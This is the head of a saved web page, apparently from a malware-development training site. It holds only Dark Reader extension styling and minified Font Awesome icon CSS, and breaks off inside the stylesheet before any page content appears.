<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="75_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="75_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="75_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\